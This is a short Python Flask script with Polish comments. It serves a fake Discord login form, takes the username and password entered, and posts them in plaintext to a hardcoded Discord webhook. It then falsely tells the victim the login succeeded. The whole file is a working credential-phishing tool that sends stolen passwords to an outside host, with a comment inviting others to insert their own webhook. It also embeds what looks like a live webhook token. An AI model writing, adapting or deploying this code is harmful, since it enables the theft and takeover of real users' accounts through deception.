from flask import Flask, request
import requests
import json

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        discord_username = request.form['discord_username']
        discord_password = request.form['discord_password']
        
        # Przetworzenie danych do webhooku JSON
        webhook_data = {
            "content": f"Użytkownik zalogował się:\nNazwa użytkownika: {discord_username}\nHasło: {discord_password}"
        }
        
        # Wysłanie danych jako webhook na Discorda
        webhook_url = "https://discord.com/api/webhooks/1205939684908474489/gdsrZwHJAXkAQ9wZbnbxaTB4SpveYq_Yd65mK-3NkhwD44PA_EW_Ppqq8rcYwdAW6BVH"  # Tutaj podaj URL swojego webhooka
        requests.post(webhook_url, json=webhook_data)
        
        return "Zalogowano pomyślnie!"
      
    return '''
    <form method="POST">
        <input type="text" name="discord_username" placeholder="Nazwa użytkownika Discord">
        <input type="password" name="discord_password" placeholder="Hasło Discord">
        <input type="submit" value="Zaloguj">
    </form>
    '''

if __name__ == '__main__':
    app.run()
